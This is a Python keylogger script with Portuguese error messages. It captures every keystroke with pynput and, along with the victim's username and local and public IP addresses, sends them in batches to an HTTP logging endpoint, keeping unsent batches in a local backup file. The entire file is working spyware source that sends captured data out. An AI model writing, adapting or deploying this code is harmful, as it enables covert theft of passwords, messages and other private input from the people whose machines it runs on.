import requests
from pynput import keyboard
import threading
import socket
import getpass
import time
import json
from datetime import datetime

API_URL = "http://127.0.0.1:5000/log"
BUFFER_LIMIT = 20
SEND_INTERVAL = 5
LOCAL_BACKUP_FILE = "unsent_keystrokes.jsonl"

buffer = []
lock = threading.Lock()

def get_local_ip():
    try:
        return socket.gethostbyname(socket.gethostname())
    except Exception as e:
        print("[ERRO IP LOCAL]", e)
        return "unknown"

def get_public_ip():
    try:
        return requests.get("https://api.ipify.org", timeout=5).text
    except Exception as e:
        print("[ERRO IP PÚBLICO]", e)
        return "unknown"

def save_local_backup(payload):
    try:
        with open(LOCAL_BACKUP_FILE, "a", encoding="utf-8") as f:
            f.write(json.dumps(payload) + "\n")
    except Exception as e:
        print("[ERRO AO SALVAR BACKUP LOCAL]", e)

def send_payload(payload):
    try:
        requests.post(API_URL, json=payload)
    except Exception as e:
        print("[FALHA AO ENVIAR]", e)
        save_local_backup(payload)

def send_buffered_keystrokes():
    while True:
        time.sleep(SEND_INTERVAL)
        with lock:
            if buffer:
                payload = {
                    "timestamp": datetime.now().isoformat(),
                    "keystrokes": buffer.copy(),
                    "local_ip": local_ip,
                    "public_ip": public_ip,
                    "username": username
                }
                send_payload(payload)
                buffer.clear()

def send_keystroke(keystroke):
    with lock:
        buffer.append(keystroke)
        if len(buffer) >= BUFFER_LIMIT:
            payload = {
                "timestamp": datetime.now().isoformat(),
                "keystrokes": buffer.copy(),
                "local_ip": local_ip,
                "public_ip": public_ip,
                "username": username
            }
            send_payload(payload)
            buffer.clear()

def normalize_key(key):
    if isinstance(key, keyboard.KeyCode):
        return key.char
    elif isinstance(key, keyboard.Key):
        return str(key).replace("Key.", "")
    return str(key)

def on_press(key):
    try:
        send_keystroke(normalize_key(key))
    except Exception as e:
        print("[ERRO ao processar tecla]", e)

# Dados fixos
local_ip = get_local_ip()
public_ip = get_public_ip()
username = getpass.getuser()

# Iniciar thread e listener
threading.Thread(target=send_buffered_keystrokes, daemon=True).start()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
